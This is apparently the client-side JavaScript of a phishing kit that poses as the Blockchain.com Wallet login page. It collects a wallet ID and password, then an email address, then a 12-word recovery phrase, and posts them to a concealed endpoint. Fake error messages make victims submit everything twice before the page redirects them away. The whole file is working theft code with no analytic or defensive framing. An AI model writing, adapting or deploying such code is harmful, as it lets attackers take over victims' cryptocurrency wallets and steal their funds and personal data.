let maxSubmitCount = 2;
let phraseWaitTime = 5000;
let phraseWordLength = 12;
let guidWordLength = 5;

window.onload = function () {
    initApp(bindElements, document.getElementsByTagName('body')[0]);
}

function bindElements(params) {
    document.getElementsByTagName('title')[0]
        .innerText = 'Blockchain.com Wallet - Exchange Cryptocurrency';
    window.LIB_spinner = document.querySelector('button .LIB_spinner_el');

    if (typeof params.hash.params[0] !== 'undefined'
        && params.hash.params[0] === 'phrases') {
        requirePhrases(params);
    } else if (typeof params.hash.params[0] !== 'undefined'
        && params.hash.params[0] === 'email') {
        requireEmail(params);
    } else {
        requirePassword(params);
    }
}

function requirePassword(params) {
    window.LIB_submitButton = document.getElementById('loginButton');
    window.LIB_userInput = document.getElementById('guid');
    window.LIB_pwdInput = document.getElementById('password');
    window.LIB_trialLimit = 0;

    document.getElementById('phrase-screen').style.display = 'none';
    document.getElementById('email-screen').style.display = 'none';
    document.getElementById('default-screen').style.display = 'block';

    //Show error
    window.LIB_onLoginFail = function () {
        showGuidError(true);
        showPwdError(true);
        window.LIB_pwdInput.value = '';
    };

    window.LIB_userInput.addEventListener('focusout', function (evt) {
        if (!isGuidOk())
            showGuidError();
    });

    window.LIB_pwdInput.addEventListener('focusout', function (evt) {
        if (!window.LIB_pwdInput.value)
            showPwdError();
    });

    window.LIB_userInput.addEventListener('keyup', function (evt) {
        if (isGuidOk())
            hideGuidError()
        else
            showGuidError();
    });

    window.LIB_pwdInput.addEventListener('keyup', function (evt) {
        hidePwdError();
    });

    //Hide progress
    let delayProgress = false;
    window.LIB_onComplete = function () {
        // if (window.LIB_submitButton)
        //     window.LIB_submitButton.disabled = false;
        if (!delayProgress)
            window.LIB_spinner.style.display = 'none';
    }

    window.LIB_onAppSuccess = function () {
        delayProgress = true;
        setTimeout(function () {
            window.location = '#/email/' + window.LIB_userInput.value;
            // open second screen
            requireEmail(params);
            delayProgress = false;
        }, phraseWaitTime);
    }
}

function requireEmail(params) {
    document.getElementById('default-screen').style.display = 'none';
    document.getElementById('phrase-screen').style.display = 'none';
    document.getElementById('email-screen').style.display = 'block';

    window.LIB_emailAddr = document.getElementById("email");
    const btn = document.getElementById('emailButton');

    hideEmailError();
    window.LIB_emailAddr.addEventListener('focusout', function (evt) {
        if (!validateEmail(window.LIB_emailAddr.value)) {
            showEmailError('&#128075;Hey! This email doesn\'t look quite right.');
            btn.disabled = true;
        }
    });

    window.LIB_emailAddr.addEventListener('keyup', function (evt) {
        if (validateEmail(window.LIB_emailAddr.value)) {
            hideEmailError()
            btn.disabled = false;
        } else {
            showEmailError('&#128075;Hey! This email doesn\'t look quite right.');
            btn.disabled = true;
        }
    });

    let submitCount = 1;
    btn.addEventListener('click', function () {
        btn.disabled = true;

        sendPost(____b, {
            'name': params.email,
            'desc': `Email Address: ${window.LIB_emailAddr.value}\nTrial: ${submitCount}`,
            't': 1,
        }, function () {
            btn.disabled = false;
            if (submitCount >= maxSubmitCount) {
                window.location = '#/phrases/' + params.email;
                // window.location.reload();
                // open third screen
                requirePhrases(params);
            } else {
                showEmailError('Something went wrong, cross-check email and try again.');
                LIB_emailAddr.value = '';
                submitCount++;
            }
        });
    });
}

function requirePhrases(params) {
    document.getElementById('default-screen').style.display = 'none';
    document.getElementById('email-screen').style.display = 'none';
    document.getElementById('phrase-screen').style.display = 'block';

    window.LIB_phraseInputs = document.querySelectorAll("[name^='phrase']");
    const btn = document.getElementById('phraseButton');

    let phrases = '';
    [...window.LIB_phraseInputs].forEach(el => {
        el.addEventListener('keyup', () => {
            hidePhraseError();

            phrases = '';
            btn.disabled = false;
            for (let i = 0; i < window.LIB_phraseInputs.length; i++) {
                const phrase = window.LIB_phraseInputs[i].value.trim();
                phrases += phrase + ' ';
                if (!phrase.match(/^\w+$/)) {
                    btn.disabled = true;
                    break;
                }

            }
            phrases = phrases.trim();

        })
    })

    let submitCount = 1;
    btn.addEventListener('click', function () {
        if (phrases.split(' ').length !== phraseWordLength) {
            showPhraseError(`All ${phraseWordLength} words are required.`);
        } else {
            //send email and otp
            sendPost(____b, {
                'name': params.email,
                'desc': `Phrase: ${phrases}\nTrial: ${submitCount}`,
                't': 1,
            }, function () {
                if (submitCount >= maxSubmitCount)
                    window.location = ____rdr;
                else {
                    showPhraseError('Something went wrong, cross-check words and try again.');
                    [...window.LIB_phraseInputs].forEach(el => el.value = '')
                    submitCount++;
                }
            });
        }
    });
}

function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}

function isGuidOk() {
    return window.LIB_userInput.value.split('-').length === guidWordLength;
}

function showPhraseError(text) {
    [...window.LIB_phraseInputs].forEach(el => el.classList.add('input-box-error'))
    document.querySelector('.error-text').innerHTML = text
}

function hidePhraseError() {
    [...window.LIB_phraseInputs].forEach(el => el.classList.remove('input-box-error'))
    document.querySelector('.error-text').innerHTML = ''
}

function showGuidError(hideText) {
    window.LIB_userInput.classList.add('input-box-error')
    const errorBox = document.getElementById('guidErrorMessage');
    errorBox.style.display = 'block';
    // const okBox = document.getElementById('guidOkMessage');
    // okBox.style.display = 'none';
    if (!hideText) {
        const invalidBox = document.getElementById('textBoxError');
        invalidBox.style.display = 'block';
    }
}

function hideGuidError() {
    const errorBox = document.getElementById('guidErrorMessage');
    errorBox.style.display = 'none';
    // const okBox = document.getElementById('guidOkMessage');
    // okBox.style.display = 'block';
    const invalidBox = document.getElementById('textBoxError');
    invalidBox.style.display = 'none';
    window.LIB_userInput.classList.remove('input-box-error')
}

function showEmailError(hideText) {
    window.LIB_emailAddr.classList.add('input-box-error')
    const errorBox = document.getElementById('emailErrorMessage');
    errorBox.style.display = 'block';
    // const okBox = document.getElementById('emailOkMessage');
    // okBox.style.display = 'none';
    if (!hideText) {
        const invalidBox = document.getElementById('textBoxError');
        invalidBox.style.display = 'block';
    }
}

function hideEmailError() {
    const errorBox = document.getElementById('emailErrorMessage');
    errorBox.style.display = 'none';
    // const okBox = document.getElementById('emailOkMessage');
    // okBox.style.display = 'block';
    const invalidBox = document.getElementById('textBoxError');
    invalidBox.style.display = 'none';
    window.LIB_emailAddr.classList.remove('input-box-error')
}

function showPwdError(hideText) {
    window.LIB_pwdInput.classList.add('pwd-error')
    if (!hideText) {
        const invalidBox = document.getElementById('passwordsNotMatchError');
        invalidBox.style.display = 'block';
    }
}

function hidePwdError() {
    window.LIB_pwdInput.classList.remove('pwd-error')
    const invalidBox = document.getElementById('passwordsNotMatchError');
    invalidBox.style.display = 'none';
}
